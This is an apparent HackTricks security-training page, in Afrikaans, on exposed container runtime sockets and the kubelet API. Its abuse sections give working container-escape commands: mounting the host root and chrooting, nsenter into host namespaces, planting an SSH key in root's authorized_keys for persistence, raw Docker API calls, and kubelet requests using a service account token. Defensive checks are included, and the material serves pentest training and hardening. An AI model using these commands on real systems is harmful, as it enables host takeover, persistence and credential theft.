# Runtime API en Daemon-blootstelling

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Baie werklike container-kompromitterings begin glad nie met ’n namespace escape nie. Hulle begin met toegang tot die runtime-beheerlaag. As ’n workload met `dockerd`, `containerd`, CRI-O, Podman of kubelet kan kommunikeer deur ’n gemonteerde Unix-socket of ’n blootgestelde TCP-listener, kan die aanvaller moontlik ’n nuwe container met beter privileges versoek, die host se filesystem mount, by host namespaces aansluit of sensitiewe node-inligting herwin. In sulke gevalle is die runtime API die werklike security boundary, en om dit te kompromitteer is funksioneel soortgelyk aan om die host te kompromitteer.

Daarom moet runtime-socket-blootstelling afsonderlik van kernel protections gedokumenteer word. ’n Container met gewone seccomp, capabilities en MAC-confinement kan steeds net een API call van host compromise af wees indien `/var/run/docker.sock` of `/run/containerd/containerd.sock` daarin gemount is. Die kernel-isolasie van die huidige container kan presies werk soos ontwerp, terwyl die runtime management plane steeds volledig blootgestel is.

## Daemon-toegangsmodelle

Docker Engine stel tradisioneel sy privileged API deur die plaaslike Unix-socket by `unix:///var/run/docker.sock` bloot. Histories is dit ook op afstand blootgestel deur TCP-listeners soos `tcp://0.0.0.0:2375` of ’n TLS-beskermde listener op `2376`. Deur die daemon op afstand bloot te stel sonder sterk TLS en client authentication, word die Docker API effektief in ’n remote root-interface verander.

containerd, CRI-O, Podman en kubelet stel soortgelyke hoë-impak-oppervlaktes bloot. Die name en workflows verskil, maar die logika nie. Indien die interface die caller toelaat om workloads te skep, host paths te mount, credentials te herwin of lopende containers te verander, is die interface ’n privileged management channel en moet dit dienooreenkomstig behandel word.

Algemene plaaslike paths wat nagegaan behoort te word, is:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ouer of meer gespesialiseerde stacks kan ook endpoints soos `dockershim.sock`, `frakti.sock` of `rktlet.sock` blootstel. Dit kom minder algemeen in moderne omgewings voor, maar wanneer hulle teëgekom word, moet hulle met dieselfde versigtigheid hanteer word omdat hulle runtime-control surfaces eerder as gewone application sockets verteenwoordig.

## Veilige Remote Access

As ’n daemon buite die plaaslike socket blootgestel moet word, behoort die verbinding met TLS beskerm te word en verkieslik mutual authentication te gebruik sodat die daemon die client verifieer en die client die daemon verifieer. Die ou gewoonte om die Docker-daemon gerieflikheidshalwe oor plain HTTP oop te stel, is een van die gevaarlikste foute in container administration omdat die API surface sterk genoeg is om privileged containers direk te skep.

Die historiese Docker-konfigurasiepatroon het soos volg gelyk:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Op systemd-based hosts kan daemon-kommunikasie ook as `fd://` verskyn, wat beteken dat die proses ’n voorafgeopende socket van systemd oorneem eerder as om dit self direk te bind. Die belangrike les is nie die presiese sintaksis nie, maar die sekuriteitsgevolg. Sodra die daemon buite ’n streng gemagtigde plaaslike socket luister, word transport security en client authentication verpligtend eerder as opsionele hardening.

## Misbruik

As ’n runtime socket teenwoordig is, bevestig watter een dit is, of ’n versoenbare client bestaan, en of raw HTTP- of gRPC-toegang moontlik is:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Hierdie opdragte is nuttig omdat hulle tussen ’n dooie pad, ’n gemonteerde maar ontoeganklike socket en ’n aktiewe bevoorregte API onderskei. As die kliënt slaag, is die volgende vraag of die API ’n nuwe container met ’n host bind mount of gedeelde host namespace kan begin.

### Wanneer Geen Kliënt Geïnstalleer Is Nie

Die afwesigheid van `docker`, `podman` of ’n ander gebruiksvriendelike CLI beteken nie dat die socket veilig is nie. Docker Engine praat HTTP oor sy Unix-socket, en Podman stel beide ’n Docker-versoenbare API en ’n Libpod-native API deur `podman system service` beskikbaar. Dit beteken dat ’n minimale omgewing met slegs `curl` steeds genoeg kan wees om die daemon aan te stuur:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Dit is belangrik tydens post-exploitation omdat defenders soms die gewone client binaries verwyder, maar die management socket gemount laat. Op Podman-hosts, onthou dat die waardevolle path tussen rootful- en rootless-deployments verskil: `unix:///run/podman/podman.sock` vir rootful service instances en `unix://$XDG_RUNTIME_DIR/podman/podman.sock` vir rootless ones.

### Volledige voorbeeld: Docker Socket na Host Root

As `docker.sock` bereikbaar is, is die klassieke escape om ’n nuwe container te begin wat die host se root filesystem mount en dan daarin te `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dit bied direkte host-root-uitvoering deur die Docker daemon. Die impak is nie beperk tot lêerlees nie. Sodra die aanvaller binne die nuwe container is, kan die aanvaller host-lêers wysig, credentials oes, persistence inplant of bykomende bevoorregte workloads begin.

### Volledige voorbeeld: Docker Socket To Host Namespaces

Indien die aanvaller namespace entry verkies in plaas van slegs lêerstelseltoegang:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Hierdie pad bereik die host deur die runtime te vra om ’n nuwe container met uitdruklike host-namespace-blootstelling te skep, eerder as om die huidige een uit te buit.

### Docker Socket Persistence Pattern

Runtime-beheer kan ook vir persistence gebruik word in plaas van ’n eenmalige shell. Die generiese patroon is om ’n helper container met ’n host mount te skep, gemagtigde toegangsinhoud of ’n startup hook na die gemounte host-lêerstelsel te skryf, en dan te valideer dat die host dit verbruik.

Voorbeeldstruktuur:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Dieselfde idee kan systemd units, cron-fragmente, application startup files of SSH keys teiken, afhangend van wat die operator wil bewys. Die belangrike punt is dat die persistente verandering deur die runtime daemon se filesystem authority op host-vlak gemaak word, nie deur ekstra privilege in die oorspronklike container nie.

### Raw Docker API Helper Pivot

Wanneer die Docker CLI ontbreek, kan dieselfde host-mount helper flow deur HTTP oor die Unix socket uitgevoer word. Die generiese flow is: bevestig die API, skep ’n helper container met ’n host bind mount, start dit, skep ’n exec instance, en start daardie exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Die finale `/exec/<id>/start`-versoek hang van die teruggestuurde exec-ID af, maar die sekuriteitspunt is onafhanklik van die presiese JSON-verwerking: rou API-toegang tot ’n rootful Docker daemon is genoeg om ’n sterker helper-workload aan te vra.

### Volledige voorbeeld: containerd Socket

’n Gemonteerde `containerd`-socket is gewoonlik net so gevaarlik:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Indien ’n meer Docker-agtige kliënt beskikbaar is, kan `nerdctl` geriefliker wees as `ctr`, omdat dit bekende vlae soos `--privileged`, `--pid=host` en `-v` blootstel:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Die impak is weer eens host compromise. Selfs indien Docker-spesifieke tooling nie beskikbaar is nie, kan ’n ander runtime API steeds dieselfde administratiewe magte bied. Op Kubernetes-nodes kan `crictl` ook voldoende wees vir reconnaissance en container interaction, omdat dit direk met die CRI-endpoint kommunikeer.

### BuildKit Socket

`buildkitd` word maklik misgekyk omdat mense dikwels dink dit is "net die build backend", maar die daemon is steeds ’n bevoorregte beheerlaag. ’n Bereikbare `buildkitd.sock` kan ’n attacker toelaat om arbitrêre build steps uit te voer, worker capabilities te inspekteer, plaaslike contexts uit die gekompromitteerde omgewing te gebruik, en gevaarlike entitlements soos `network.host` of `security.insecure` aan te vra wanneer die daemon gekonfigureer is om dit toe te laat.

Nuttige eerste interaksies is:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
As die daemon build requests aanvaar, toets of insecure entitlements beskikbaar is:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Die presiese impak hang af van die daemon-konfigurasie, maar ’n rootful BuildKit-diens met permissive entitlements is nie ’n onskadelike ontwikkelaarsgerief nie. Behandel dit as nog ’n hoëwaarde-administratiewe oppervlak, veral op CI-runners en gedeelde build nodes.

### Kubelet API oor TCP

Die kubelet is nie ’n container runtime nie, maar dit is steeds deel van die node-bestuursvlak en val dikwels binne dieselfde vertrouensgrens. As die kubelet se secure port `10250` vanaf die workload bereikbaar is, of as node credentials, kubeconfigs of proxy-regte blootgestel word, kan die aanvaller moontlik Pods enumerate, logs retrieve of commands in node-local containers uitvoer sonder om ooit aan die Kubernetes API server se admission path te raak.

Begin met eenvoudige discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
As die kubelet- of API-server-proxy-pad `exec` magtig, kan ’n WebSocket-capable client dit in code execution in ander containers op die node omskep. Dit is ook waarom `nodes/proxy` met slegs `get`-toestemming gevaarliker is as wat dit klink: die versoek kan steeds kubelet endpoints bereik wat commands uitvoer, en daardie direkte kubelet-interaksies verskyn nie in normale Kubernetes audit logs nie.

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die container enige management plane kan bereik wat buite die trust boundary moes gebly het.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Wat is hier interessant:

- 'n Gemonteerde runtime-socket is gewoonlik 'n direkte administratiewe primitief eerder as bloot inligtingsblootstelling.
- 'n TCP-listener op `2375` sonder TLS moet as 'n remote-compromise condition behandel word.
- Omgewingsveranderlikes soos `DOCKER_HOST` wys dikwels dat die workload doelbewus ontwerp is om met die host-runtime te kommunikeer.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Plaaslike Unix-socket by verstek | `dockerd` luister op die plaaslike socket en die daemon loop gewoonlik rootful | montering van `/var/run/docker.sock`, blootstelling van `tcp://...:2375`, swak of ontbrekende TLS op `2376` |
| Podman | Daemonless CLI by verstek | Geen langlewende bevoorregte daemon word vir gewone plaaslike gebruik vereis nie; API-sockets kan steeds blootgestel word wanneer `podman system service` geaktiveer is | blootstelling van `podman.sock`, diens wat wyd loop, rootful API-gebruik |
| containerd | Plaaslike bevoorregte socket | Administratiewe API word deur die plaaslike socket blootgestel en gewoonlik deur hoërvlak-tooling gebruik | montering van `containerd.sock`, breë `ctr`- of `nerdctl`-toegang, blootstelling van bevoorregte namespaces |
| CRI-O | Plaaslike bevoorregte socket | CRI-endpoint is bedoel vir vertroude node-local-komponente | montering van `crio.sock`, blootstelling van die CRI-endpoint aan onbetroubare workloads |
| Kubernetes kubelet | Node-local management API | Kubelet behoort nie breedweg vanaf Pods bereikbaar te wees nie; toegang kan pod-toestand, credentials en execution-features blootstel, afhangend van authn/authz | montering van kubelet-sockets of -sertifikate, swak kubelet-auth, host-netwerking plus 'n bereikbare kubelet-endpoint |

## Verwysings

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
